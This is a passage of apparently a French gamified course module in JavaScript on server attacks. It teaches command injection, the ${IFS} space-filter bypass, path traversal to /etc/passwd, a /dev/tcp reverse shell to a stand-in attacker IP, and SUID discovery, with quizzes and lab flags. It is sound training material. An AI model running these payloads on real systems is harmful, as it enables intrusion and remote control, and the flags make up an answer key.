// Curriculum Track 5: Failles Serveur & Élévation Root (RCE / PrivEsc) - 9 Levels
module.exports = [
  // 1. Qu'est-ce qu'une Command Injection (RCE) ?
  {
    id: 'm5-l1',
    unitId: 'm5',
    title: "1. Qu'est-ce qu'une Command Injection (RCE) ?",
    icon: '⚡',
    xp: 40,
    lessonSlides: [
      {
        title: "La Faille Serveur Suprême : RCE",
        bullets: [
          "**RCE** signifie **Remote Code Execution** (Exécution de Code à Distance).",
          "C'est le Graal absolu de tout attaquant : réussir à forcer le serveur distant à exécuter n'importe quelle commande système comme s'il était assis devant l'écran du data center !",
          "Cela se produit quand une application web fait appel à des outils du système d'exploitation (comme `ping`, `nslookup`, `convert`) pour accomplir une tâche."
        ]
      },
      {
        title: "L'Exemple Typique du Ping Web",
        bullets: [
          "Imagine une page d'administration réseau avec un champ *Tester la connectivité d'une IP*.",
          "Côté serveur, le développeur exécute en arrière-plan : `exec(\"ping -c 2 \" + userIP)`.",
          "Si l'utilisateur tape une IP normale `127.0.0.1`, tout va bien. Mais que se passe-t-il s'il ajoute des caractères spéciaux du shell ?"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="20" width="350" height="80" rx="8" fill="#030712" stroke="#f43f5e" stroke-width="2"/>
          <text x="35" y="45" fill="#f87171" font-size="11" font-family="monospace">APPEL SYSTÈME VULNÉRABLE :</text>
          <text x="35" y="70" fill="#94a3b8" font-size="11" font-family="monospace">child_process.exec("ping -c 2 " + <tspan fill="#f59e0b" font-weight="bold">targetIP</tspan>)</text>
          <text x="35" y="88" fill="#38bdf8" font-size="9" font-family="monospace">Exécuté avec les droits du serveur web (www-data)</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "// ❌ CODE BACKEND DANGEREUX : Appel direct au shell système :" },
          { num: 2, text: "exec(`ping -c 1 ${req.body.ip}`, (error, stdout) => {", isCritical: true, note: "exec invoque /bin/sh : tout métacaractère injecté sera exécuté comme une commande distincte" },
          { num: 3, text: "  res.send(stdout);" },
          { num: 4, text: "});" }
        ],
        prompt: "Clique sur la ligne de code exécutant la commande shell non assainie :"
      },
      tokenPuzzle: {
        instruction: "Assemble l'appel système vulnérable de la fonction de diagnostic :",
        tokens: ["exec(`ping -c 1", "${req.body.ip}`,", "(err, stdout) => {});"],
        correctOrder: ["exec(`ping -c 1", "${req.body.ip}`,", "(err, stdout) => {});"]
      },
      quickQuiz: {
        prompt: "Quelle est la conséquence immédiate d'une vulnérabilité d'injection de commande (RCE) réussie ?",
        options: [
          { text: "L'attaquant peut exécuter des commandes arbitraires du système d'exploitation avec les droits du processus du serveur web.", isCorrect: true, debrief: "Exact ! Cela permet de lire des fichiers, voler des identifiants et installer une porte dérobée." },
          { text: "L'écran de l'ordinateur de l'attaquant s'éteint pour économiser l'énergie.", isCorrect: false, debrief: "Faux. L'attaque donne un contrôle accru, elle n'éteint rien." },
          { text: "La base de données SQLite est automatiquement sauvegardée sur une clé USB.", isCorrect: false, debrief: "Faux. Une RCE n'effectue aucune sauvegarde automatique." },
          { text: "La vitesse du ventilateur du serveur est réduite à zéro.", isCorrect: false, debrief: "Faux. RCE est une exécution de logique logicielle." }
        ]
      }
    },
    challenge: {
      type: 'ping_target',
      instructions: "Dans l'outil de diagnostic Net-Probe ci-dessous, teste une adresse IP légitime en saisissant '127.0.0.1'. Soumets la première ligne de réponse ping retournée (64 bytes from 127.0.0.1) !",
      flag: '64 bytes from 127.0.0.1'
    }
  },

  // 2. Les Métacaractères de Concaténation Shell (;, &&, |)
  {
    id: 'm5-l2',
    unitId: 'm5',
    title: "2. Les Métacaractères Shell (;, &&, |)",
    icon: '🔗',
    xp: 40,
    lessonSlides: [
      {
        title: "Comment Enchaîner Deux Commandes en Bash",
        bullets: [
          "Dans un terminal Bash, tu n'es pas obligé d'appuyer sur Entrée pour chaque ordre. Tu peux chaîner plusieurs commandes sur une seule ligne à l'aide de **métacaractères** :",
          "• `;` (point-virgule) : exécute la première commande, puis exécute la seconde quoi qu'il arrive.",
          "• `&&` (double ET commercial) : exécute la seconde commande **uniquement si la première a réussi**.",
          "• `||` (double barre) : exécute la seconde commande si la première a échoué.",
          "• `|` (pipe) : injecte la sortie de la première dans l'entrée de la seconde."
        ]
      },
      {
        title: "Détourner le Ping",
        bullets: [
          "Si le serveur exécute `ping -c 1 [ENTREE]`, et que l'attaquant tape :",
          "`127.0.0.1; whoami`",
          "Le shell Linux exécute le ping, puis exécute immédiatement `whoami` !",
          "Le serveur web renvoie alors le nom de son utilisateur système (souvent `www-data`)."
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="140" height="70" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="95" y="55" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle">ping -c 1 127.0.0.1</text>
          <text x="95" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Commande n°1</text>
          <rect x="180" y="45" width="40" height="30" rx="6" fill="#f59e0b"/>
          <text x="200" y="65" fill="#000" font-size="16" font-family="monospace" text-anchor="middle" font-weight="bold">;</text>
          <rect x="235" y="25" width="140" height="70" rx="8" fill="#0f172a" stroke="#f43f5e" stroke-width="2"/>
          <text x="305" y="55" fill="#f87171" font-size="11" font-family="monospace" text-anchor="middle">whoami</text>
          <text x="305" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Commande n°2 injectée !</text>
        </svg>
      `,
      codeSnippet: {
        language: 'bash',
        lines: [
          { num: 1, text: "# Injection de commande via le séparateur point-virgule ; :" },
          { num: 2, text: "operator@cyberlab:~$ ping -c 1 127.0.0.1; whoami", isCritical: true, note: "Le point-virgule sépare deux commandes indépendantes exécutées à la suite" },
          { num: 3, text: "64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.03 ms" },
          { num: 4, text: "www-data" }
        ],
        prompt: "Clique sur la ligne démontrant l'enchaînement de commandes avec le point-virgule :"
      },
      tokenPuzzle: {
        instruction: "Assemble le payload d'injection pour tester whoami après le ping :",
        tokens: ["127.0.0.1;", "whoami", "pwd", "rm"],
        correctOrder: ["127.0.0.1;", "whoami"]
      },
      quickQuiz: {
        prompt: "Quel symbole shell universel permet d'exécuter une seconde commande indépendamment du succès de la première ?",
        options: [
          { text: "Le point-virgule ';' (sépare deux instructions consécutives en Bash).", isCorrect: true, debrief: "Exact ! Le point-virgule est le délimiteur standard de fin d'instruction shell." },
          { text: "Le point d'interrogation '?'", isCorrect: false, debrief: "Faux. '?' est un métacaractère de remplacement de caractère unique." },
          { text: "L'arobase '@'", isCorrect: false, debrief: "Faux. '@' sert aux tableaux ou aux utilisateurs." },
          { text: "Le tiret bas '_'", isCorrect: false, debrief: "Faux. '_' est un caractère alphanumérique classique." }
        ]
      }
    },
    challenge: {
      type: 'ping_target',
      instructions: "Dans Net-Probe, injecte '127.0.0.1; whoami' dans le champ d'adresse. Soumets l'utilisateur système du serveur web affiché (www-data) !",
      flag: 'www-data'
    }
  },

  // 3. Échapper aux Filtres et Espaces (${IFS})
  {
    id: 'm5-l3',
    unitId: 'm5',
    title: "3. Contourner les Filtres et Espaces (${IFS})",
    icon: '🥷',
    xp: 45,
    lessonSlides: [
      {
        title: "Quand le Développeur Tente de Filtrer",
        bullets: [
          "La plupart des développeurs débutants essaient de bloquer les RCE avec des filtres naïfs : *S'il y a un espace dans l'entrée, je rejette la requête !*.",
          "Est-ce que cela arrête un pentesteur chevronné ? Absolument pas !",
          "Sous Linux, le shell possède une variable interne spéciale appelée **IFS** (Internal Field Separator)."
        ]
      },
      {
        title: "Remplacer l'Espace par ${IFS}",
        bullets: [
          "La variable `${IFS}` contient par défaut l'espace, la tabulation et le retour à la ligne.",
          "Si le mot de passe ou le fichier contient des espaces interdits, on écrit :",
          "`cat${IFS}/etc/passwd` au lieu de `cat /etc/passwd` !",
          "Le shell Linux interprète `${IFS}` exactement comme un espace authentique, et le filtre de sécurité est réduit à néant."
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#f43f5e" stroke-width="2"/>
          <text x="107" y="50" fill="#f87171" font-size="11" font-family="monospace" text-anchor="middle">cat /etc/passwd</text>
          <text x="107" y="70" fill="#f43f5e" font-size="9" font-family="monospace" text-anchor="middle">❌ Espace bloqué par le filtre !</text>
          <path d="M 200 60 L 235 60" stroke="#10b981" stroke-width="2"/>
          <rect x="245" y="25" width="140" height="70" rx="8" fill="#030712" stroke="#10b981" stroke-width="2"/>
          <text x="315" y="50" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle">cat\${IFS}/etc/passwd</text>
          <text x="315" y="70" fill="#34d399" font-size="9" font-family="monospace" text-anchor="middle">✓ Contournement validé !</text>
        </svg>
      `,
      codeSnippet: {
        language: 'bash',
        lines: [
          { num: 1, text: "# Lecture de fichiers sans aucun espace physique :" },
          { num: 2, text: "127.0.0.1;cat${IFS}/etc/passwd", isCritical: true, note: "${IFS} est interprété par le shell comme un séparateur d'espace standard" },
          { num: 3, text: "root:x:0:0:root:/root:/bin/bash" }
        ],
        prompt: "Clique sur la charge utile qui remplace l'espace par ${IFS} :"
      },
      tokenPuzzle: {
        instruction: "Assemble le payload de contournement de filtre d'espace avec ${IFS} :",
        tokens: ["127.0.0.1;", "cat${IFS}", "/etc/passwd", "rm -rf"],
        correctOrder: ["127.0.0.1;", "cat${IFS}", "/etc/passwd"]
      },
      quickQuiz: {
        prompt: "Que désigne précisément la variable d'environnement '${IFS}' dans un shell Bash ?",
        options: [
          { text: "Internal Field Separator (le séparateur de champs par défaut du shell contenant l'espace, la tabulation et le saut de ligne).", isCorrect: true, debrief: "Exact ! Le shell s'en sert pour découper les mots d'une ligne de commande." },
          { text: "Internet Firewall System (le pare-feu logiciel de Linux).", isCorrect: false, debrief: "Faux. Le pare-feu Linux est iptables / nftables." },
          { text: "Inode File Storage (le format de table d'allocation du disque).", isCorrect: false, debrief: "Faux. C'est ext4, pas IFS." },
          { text: "Instruction Frequency Sensor (la fréquence de l'horloge du processeur).", isCorrect: false, debrief: "Faux. Aucun rapport avec le matériel." }
        ]
      }
    },
    challenge: {
      type: 'ping_target',
      instructions: "Dans Net-Probe, injecte '127.0.0.1;cat${IFS}/etc/passwd' pour contourner le filtre d'espace et lire les comptes. Soumets le drapeau CYBER{...} révélé !",
      flag: 'CYBER{COMMAND_INJECTION_IFS_WILDCARD_BYPASS}'
    }
  },

  // ★ CHECKPOINT ÉVALUATION MI-PARCOURS TRACK 5 ★
  {
    id: 'm5-mid',
    unitId: 'm5',
    title: "ÉVALUATION MI-PARCOURS : EXPLOITATION RCE & BYPASS WAF",
    icon: '🛡️',
    isCheckpoint: true,
    xp: 75,
    lessonSlides: [
      {
        title: "TEST D'INTRUSION SERVEUR : Diagnostic Réseau Filtré",
        bullets: [
          "L'infrastructure héberge un utilitaire web de diagnostic ping pour surveiller la connectivité des passerelles.",
          "Le filtre applicatif (WAF) bloque tout caractère espace (` `), croyant ainsi rendre impossible l'exécution de commandes secondaires avec arguments.",
          "Cette épreuve récapitule : injection de commande à distance (RCE), métacaractères d'enchaînement (`;`, `&&`, `|`) et contournement d'assainissement avec `${IFS}`."
        ]
      },
      {
        title: "Consignes de la Mission d'Exploitation (Sans Guidage)",
        bullets: [
          "1. Ouvre la console de test Net-Probe ci-dessous.",
          "2. Forge une charge d'injection sans aucun espace direct.",
          "3. Utilise la variable d'espacement Bash `${IFS}` pour concaténer une lecture du fichier système `/etc/passwd` et extraire le flag de checkpoint !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 500 130" class="w-full h-full">
          <rect width="500" height="130" rx="12" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
          <circle cx="65" cy="65" r="32" fill="#f59e0b" fill-opacity="0.15" stroke="#f59e0b" stroke-width="2"/>
          <text x="65" y="74" fill="#f59e0b" font-size="28" text-anchor="middle">🛡️</text>
          <text x="120" y="45" fill="#f8fafc" font-size="14" font-family="monospace" font-weight="bold">CHECKPOINT RCE & WAF MI-PARCOURS</text>
          <text x="120" y="70" fill="#94a3b8" font-size="11" font-family="monospace">Vecteur : Injection Ping / Paramètre host sans espaces</text>
          <rect x="120" y="85" width="350" height="26" rx="6" fill="#1e293b" stroke="#334155"/>
          <text x="130" y="102" fill="#f59e0b" font-size="11" font-family="monospace">Contrainte : Utilisation stricte de \${IFS}</text>
        </svg>
      `,
      codeSnippet: {
        language: 'bash',
        lines: [
          { num: 1, text: "# Exploitation RCE : enchaînement et contournement du filtre d'espaces" },
          { num: 2, text: "127.0.0.1;cat${IFS}/etc/passwd", isCritical: true, note: "Le point-virgule enchaîne la commande et ${IFS} contourne l'interdiction de l'espace" },
          { num: 3, text: "CHECKPOINT_FLAG: CYBER{SERVER_MID_EVAL_COMMAND_CHAIN_PWNED}" }
        ],
        prompt: "Clique sur la charge utile qui enchaîne la lecture système tout en dupant le filtre WAF :"
      },
      tokenPuzzle: {
        instruction: "Reconstitue la charge d'injection complète sans aucun espace brut :",
        tokens: ["127.0.0.1;", "cat${IFS}", "/etc/passwd", "curl"],
        correctOrder: ["127.0.0.1;", "cat${IFS}", "/etc/passwd"]
      },
      quickQuiz: {
        prompt: "Pourquoi un filtre applicatif qui supprime ou interdit les espaces simples est-il totalement insuffisant contre une RCE ?",
        options: [
          { text: "Parce que le shell interprète des alternatives natives comme ${IFS}, {cat,/etc/passwd} ou les redirections sans espace.", isCorrect: true, debrief: "Exact ! Le shell POSIX offre de nombreuses syntaxes équivalentes pour séparer les arguments." },
          { text: "Parce que l'espace n'existe pas en binaire.", isCorrect: false, debrief: "Faux. L'espace ASCII 0x20 existe bien en mémoire." },
          { text: "Parce que le câble Ethernet réinsère automatiquement les espaces perdus.", isCorrect: false, debrief: "Faux. Le câble transporte les trames physiques sans interprétation de mots." },
          { text: "Parce que le processeur Intel ignore les filtres du système d'exploitation.", isCorrect: false, debrief: "Faux. C'est une question de syntaxe de parsing du shell." }
        ]
      }
    },
    challenge: {
      type: 'ping_target',
      instructions: "Dans Net-Probe, chaîne l'adresse 127.0.0.1 avec la lecture de /etc/passwd en utilisant ${IFS} pour contourner le filtre d'espace. Soumets la valeur du CHECKPOINT_FLAG !",
      flag: 'CYBER{SERVER_MID_EVAL_COMMAND_CHAIN_PWNED}'
    }
  },

  // 4. Traversée de Répertoire (Path Traversal / LFI)
  {
    id: 'm5-l4',
    unitId: 'm5',
    title: "4. Traversée de Répertoire (LFI / Path Traversal)",
    icon: '📂',
    xp: 45,
    lessonSlides: [
      {
        title: "Sortir de la Prison Web : Le Path Traversal",
        bullets: [
          "Normalement, un serveur web ne doit autoriser l'accès qu'aux fichiers situés dans son dossier public (comme `/var/www/html/`).",
          "Mais si un script PHP ou Node lit un fichier passé dans l'URL : `readDocument(req.query.file)` sans contrôle de sécurité, que peut-il se passer ?",
          "Tu te rappelles de la commande `cd ..` pour remonter d'un étage ?"
        ]
      },
      {
        title: "La Séquence Magique ../../..",
        bullets: [
          "En fournissant `../../../../etc/passwd` au lieu d'un nom de document ordinaire, tu ordonnes au serveur de :",
          "1. Remonter d'un dossier.",
          "2. Remonter encore.",
          "3. Atteindre la racine `/` du système.",
          "4. Entrer dans `/etc/` et lire le fichier sensible `/etc/passwd` !",
          "C'est ce qu'on appelle une faille **LFI** (Local File Inclusion / Path Traversal)."
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="150" height="70" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="100" y="50" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle">/var/www/html/</text>
          <text x="100" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Racine Web autorisée</text>
          <path d="M 185 60 L 225 60" stroke="#f43f5e" stroke-width="3"/>
          <rect x="235" y="25" width="140" height="70" rx="8" fill="#030712" stroke="#f43f5e" stroke-width="2"/>
          <text x="305" y="50" fill="#f87171" font-size="11" font-family="monospace" text-anchor="middle">/etc/passwd</text>
          <text x="305" y="70" fill="#f43f5e" font-size="9" font-family="monospace" text-anchor="middle">../../../../etc/passwd</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "// ❌ CODE BACKEND VULNÉRABLE AU PATH TRAVERSAL :" },
          { num: 2, text: "const filePath = path.join('/var/www/docs', req.query.file);", isCritical: true, note: "path.join résout les séquences .. et permet de sortir de /var/www/docs" },
          { num: 3, text: "res.sendFile(filePath); // Télécharge n'importe quel fichier système !" }
        ],
        prompt: "Clique sur la ligne de code où les chemins relatifs .. ne sont pas assainis :"
      },
      tokenPuzzle: {
        instruction: "Assemble le payload classique de traversée de répertoire vers /etc/passwd :",
        tokens: ["../../../../", "etc/passwd", "/home", "rm"],
        correctOrder: ["../../../../", "etc/passwd"]
      },
      quickQuiz: {
        prompt: "Comment les séquences de points '../../..' permettent-elles d'accéder à des fichiers système confidentiels ?",
        options: [
          { text: "En faisant remonter l'arborescence des dossiers jusqu'à la racine '/', annulant ainsi la restriction du dossier web initial.", isCorrect: true, debrief: "Exact ! Chaque '..' remonte d'un niveau jusqu'à atteindre la racine absolue." },
          { text: "En supprimant les mots de passe du disque dur.", isCorrect: false, debrief: "Faux. La traversée de répertoire n'efface rien, elle lit." },
          { text: "En forçant le processeur à surchauffer.", isCorrect: false, debrief: "Faux. Aucun lien physique." },
          { text: "En modifiant l'adresse IP de la victime.", isCorrect: false, debrief: "Faux. Les adresses IP ne changent pas." }
        ]
      }
    },
    challenge: {
      type: 'lfi_target',
      instructions: "Dans la visionneuse de documents d'entreprise ci-dessous, injecte '../../../../etc/passwd' dans le champ de sélection. Soumets le drapeau CYBER{...} trouvé dans les comptes !",
      flag: 'CYBER{LFI_PATH_TRAVERSAL_ETC_PASSWD}'
    }
  },

  // 5. Qu'est-ce qu'un Reverse Shell ?
  {
    id: 'm5-l5',
    unitId: 'm5',
    title: "5. Le Concept du Reverse Shell (Connexion Inversée)",
    icon: '🔄',
    xp: 50,
    lessonSlides: [
      {
        title: "Le Problème du Pare-Feu (Firewall)",
        bullets: [
          "Quand un pirate veut prendre le contrôle d'un serveur distant, pourquoi ne peut-il pas simplement ouvrir un port SSH ou un shell d'écoute direct (**Bind Shell**) ?",
          "Parce que les pare-feux d'entreprise bloquent **TOUTES les connexions entrantes** !",
          "En revanche, les pare-feux laissent presque toujours sortir les connexions vers le Web extérieur."
        ]
      },
      {
        title: "La Ruse du Reverse Shell",
        bullets: [
          "La solution de génie est le **Reverse Shell** (shell inversé) :",
          "1. L'attaquant met sa propre machine en écoute sur un port avec Netcat : `nc -lvnp 4444`.",
          "2. Via une faille RCE sur le serveur, il force la cible à initier une connexion **SORTANTE** vers l'attaquant : `bash -i >& /dev/tcp/IP_ATTAQUANT/4444 0>&1`.",
          "3. Le pare-feu autorise le flux sortant, et le serveur distant offre son propre terminal interactif sur l'écran du pirate !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="130" height="70" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="90" y="55" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle">Serveur Cible</text>
          <text x="90" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Exécute le payload</text>
          <path d="M 165 60 L 235 60" stroke="#f43f5e" stroke-width="3"/>
          <text x="200" y="50" fill="#f87171" font-size="9" font-family="monospace" text-anchor="middle">SORTANT ➔</text>
          <rect x="245" y="25" width="130" height="70" rx="8" fill="#030712" stroke="#10b981" stroke-width="2"/>
          <text x="310" y="55" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle">Machine Attaquant</text>
          <text x="310" y="75" fill="#10b981" font-size="9" font-family="monospace" text-anchor="middle">nc -lvnp 4444 (Écoute)</text>
        </svg>
      `,
      codeSnippet: {
        language: 'bash',
        lines: [
          { num: 1, text: "# 1. Sur la machine de l'attaquant : mise en écoute netcat :" },
          { num: 2, text: "attacker@kali:~$ nc -lvnp 4444" },
          { num: 3, text: "# 2. Payload injecté sur la cible pour initier la connexion sortante :" },
          { num: 4, text: "target@server:~$ bash -i >& /dev/tcp/192.168.1.50/4444 0>&1", isCritical: true, note: "Redirige stdin, stdout et stderr vers le socket TCP de l'attaquant" }
        ],
        prompt: "Clique sur la charge utile qui initie la connexion inversée sortante :"
      },
      tokenPuzzle: {
        instruction: "Construis la commande de redirection de socket vers /dev/tcp :",
        tokens: ["bash -i >&", "/dev/tcp/192.168.1.50/4444", "0>&1", "ping"],
        correctOrder: ["bash -i >&", "/dev/tcp/192.168.1.50/4444", "0>&1"]
      },
      quickQuiz: {
        prompt: "Pourquoi préfère-t-on utiliser un Reverse Shell plutôt qu'un Bind Shell lors d'un test d'intrusion externe ?",
        options: [
          { text: "Parce que les pare-feux bloquent généralement les connexions entrantes mais autorisent les flux réseau sortants initiés par la cible.", isCorrect: true, debrief: "Exactement ! Le reverse shell traverse naturellement les pare-feux et NAT d'entreprise." },
          { text: "Parce que le reverse shell double la bande passante de la connexion.", isCorrect: false, debrief: "Faux. Il n'a aucun impact sur le débit réseau physique." },
          { text: "Parce que les Bind Shells sont interdits par l'Union Européenne.", isCorrect: false, debrief: "Faux. C'est une question de topologie de pare-feu réseau, pas de législation." },
          { text: "Parce que le reverse shell ne nécessite aucun ordinateur.", isCorrect: false, debrief: "Faux. Il nécessite deux machines connectées." }
        ]
      }
    },
    challenge: {
      type: 'ping_target',
      instructions: "Dans Net-Probe, simule la connexion socket sortante en injectant une redirection socket vers /dev/tcp. Soumets le drapeau CYBER{...} capturé sur l'écouteur !",
      flag: 'CYBER{RAW_SOCKET_BEACON_CAPTURED}'
    }
  },

  // 6. Les Privilèges Linux : Utilisateur Ordinaire vs Root
  {
    id: 'm5-l6',
    unitId: 'm5',
    title: "6. Privilèges Linux : De www-data à Root",
    icon: '👑',
    xp: 45,
    lessonSlides: [
      {
        title: "La Différence Entre un Compte Restreint et le Dieu Root",
        bullets: [
          "Quand tu obtiens un accès initial via une faille web (RCE), tu es généralement connecté sous l'utilisateur du serveur web : `www-data` ou `operator`.",
          "Ce compte est bridé : tu ne peux pas lire les mots de passe maîtres dans `/etc/shadow`, tu ne peux pas installer de pilotes, ni espionner le trafic réseau.",
          "Ton objectif ultime est de devenir **root** (l'administrateur suprême qui a tous les pouvoirs sur le noyau Linux)."
        ]
      },
      {
        title: "L'Audit des Privilèges : La Commande id",
        bullets: [
          "Chaque utilisateur possède un **UID** (User ID) numérique :",
          "• Les utilisateurs normaux ont un UID supérieur ou égal à 1000.",
          "• L'administrateur suprême **root possède TOUJOURS l'UID 0** !",
          "La commande `id` affiche instantanément ton UID, ton GID et tous tes groupes de sécurité."
        ],
        syntaxBox: {
          command: "id",
          description: "Affiche l'UID, le GID et les groupes de l'utilisateur actif.",
          example: "uid=1001(operator) gid=1001(operator) groups=1001(operator)"
        }
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#475569" stroke-width="2"/>
          <text x="107" y="50" fill="#94a3b8" font-size="11" font-family="monospace" text-anchor="middle">operator (UID 1001)</text>
          <text x="107" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Droits restreints ($)</text>
          <text x="107" y="85" fill="#f43f5e" font-size="9" font-family="monospace" text-anchor="middle">Lecture /etc/shadow INTERDITE</text>
          <path d="M 200 60 L 235 60" stroke="#f59e0b" stroke-width="3"/>
          <rect x="245" y="25" width="140" height="70" rx="8" fill="#030712" stroke="#10b981" stroke-width="2"/>
          <text x="315" y="50" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle">ROOT (UID 0)</text>
          <text x="315" y="70" fill="#34d399" font-size="9" font-family="monospace" text-anchor="middle">Pouvoirs suprêmes (#)</text>
          <text x="315" y="85" fill="#38bdf8" font-size="9" font-family="monospace" text-anchor="middle">Accès total à tout</text>
        </svg>
      `,
      codeSnippet: {
        language: 'bash',
        lines: [
          { num: 1, text: "# Vérification de l'identité et de l'UID système :" },
          { num: 2, text: "operator@cyberlab:~$ id", isCritical: true, note: "id affiche l'UID : 0 pour root, 1000+ pour utilisateur ordinaire" },
          { num: 3, text: "uid=1001(operator) gid=1001(operator) groups=1001(operator),27(sudo)" }
        ],
        prompt: "Clique sur la commande qui vérifie les identifiants UID et GID :"
      },
      tokenPuzzle: {
        instruction: "Tape la commande pour afficher tes identifiants numériques de compte :",
        tokens: ["id", "whoami", "hostname", "uname"],
        correctOrder: ["id"]
      },
      quickQuiz: {
        prompt: "Quel est l'identifiant numérique d'utilisateur (UID) réservé universellement au compte super-administrateur root sous Linux ?",
        options: [
          { text: "L'UID 0 (zéro).", isCorrect: true, debrief: "Exact ! Sous Linux, c'est l'UID 0 qui confère l'immunité et les droits absolus, quel que soit le nom d'utilisateur." },
          { text: "L'UID 1000.", isCorrect: false, debrief: "Faux. L'UID 1000 est attribué au premier utilisateur standard créé lors de l'installation." },
          { text: "L'UID 9999.", isCorrect: false, debrief: "Faux. 9999 est un compte ordinaire ou de service." },
          { text: "L'UID 404.", isCorrect: false, debrief: "Faux. 404 est un code HTTP, pas un UID système." }
        ]
      }
    },
    challenge: {
      type: 'terminal',
      instructions: "Dans le terminal, tape 'id' pour auditer ton utilisateur. Soumets la première chaîne d'identifiant retournée (uid=1001(operator)) !",
      flag: 'uid=1001(operator)'
    }
  },

  // 7. L'Arme Fatale : Les Binaires SUID
  {
    id: 'm5-l7',
    unitId: 'm5',
    title: "7. L'Arme Fatale : Les Binaires SUID",
    icon: '⚡',
    xp: 50,
    lessonSlides: [
      {
        title: "La Faille d'Élévation la Plus Célèbre : SUID",
        bullets: [
          "Normalement, quand tu exécutes un programme, il tourne avec **tes propres droits** (ceux d'un utilisateur ordinaire).",
          "Mais Linux possède un bit de permission spéciale appelé le **SetUID** (**SUID**).",
          "Quand un binaire possède le bit SUID, il s'exécute avec les privilèges du **propriétaire du fichier**... qui est très souvent **root** !"
        ]
      },
      {
        title: "Comment Repérer les Binaires SUID",
        bullets: [
          "Dans un listing `ls -l`, le 'x' d'exécution du propriétaire est remplacé par un '**s**' rouge : `-rwsr-xr-x`.",
          "Pour chasser tous les binaires SUID du système, on lance la commande :",
          "`find / -perm -u=s -type f 2>/dev/null`.",
          "Si un utilitaire ordinaire est listé, la conquête du compte root est à portée de main !"
        ],
        syntaxBox: {
          command: "find / -perm -u=s 2>/dev/null",
          description: "Scanne tout le disque à la recherche de fichiers ayant le bit SUID actif.",
          example: "/usr/bin/find  /usr/bin/passwd"
        }
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
          <text x="107" y="48" fill="#fbbf24" font-size="10" font-family="monospace" text-anchor="middle">Bit SUID actif : 's'</text>
          <text x="107" y="68" fill="#f87171" font-size="11" font-family="monospace" text-anchor="middle">-rw<tspan font-weight="bold">s</tspan>r-xr-x /usr/bin/find</text>
          <text x="107" y="85" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Propriétaire : root</text>
          <path d="M 200 60 L 235 60" stroke="#10b981" stroke-width="3"/>
          <rect x="245" y="25" width="140" height="70" rx="8" fill="#030712" stroke="#10b981" stroke-width="2"/>
          <text x="315" y="50" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle">Exécution = ROOT (#)</text>
          <text x="315" y="70" fill="#34d399" font-size="9" font-family="monospace" text-anchor="middle">PrivEsc Immédiat !</text>
        </svg>
      `,
      codeSnippet: {
        language: 'bash',
        lines: [
          { num: 1, text: "# Découverte des binaires possédant la permission spéciale SUID :" },
          { num: 2, text: "operator@cyberlab:~$ find / -perm -u=s 2>/dev/null", isCritical: true, note: "-perm -u=s filtre les fichiers dont le bit SetUID est armé" },
          { num: 3, text: "/usr/bin/passwd" },
          { num: 4, text: "/usr/bin/find" }
        ],
        prompt: "Clique sur la commande find qui recherche les binaires SUID :"
      },
      tokenPuzzle: {
        instruction: "Tape la commande universelle de détection des binaires SUID :",
        tokens: ["find /", "-perm -u=s", "2>/dev/null", "grep"],
        correctOrder: ["find /", "-perm -u=s", "2>/dev/null"]
      },
      quickQuiz: {
        prompt: "Que provoque l'activation du bit spécial SUID sur un fichier exécutable appartenant à l'utilisateur root ?",
        options: [
          { text: "Toute personne qui lance ce programme l'exécute temporairement avec les privilèges et pouvoirs de root.", isCorrect: true, debrief: "Exact ! Le bit SUID élève l'eUID (effective UID) au niveau du propriétaire du fichier." },
          { text: "Le fichier devient impossible à supprimer pour toujours.", isCorrect: false, debrief: "Faux. root peut toujours supprimer n'importe quel fichier." },
          { text: "Le fichier est automatiquement chiffré en AES-256.", isCorrect: false, debrief: "Faux. Le SUID n'est pas un système de chiffrement." },
          { text: "Le terminal refuse d'ouvrir le dossier personnel.", isCorrect: false, debrief: "Faux. Cela n'affecte pas la navigation." }
        ]
      }
    },
    challenge: {
      type: 'terminal',
      instructions: "Dans le terminal, cherche les binaires SUID avec 'find / -perm -u=s 2>/dev/null'. Repère le binaire anormal /usr/bin/find et soumets son chemin complet !",
      flag: '/usr/bin/find'
    }
  },

  // 8. La Référence GTFOBins : Élévation via SUID
  {
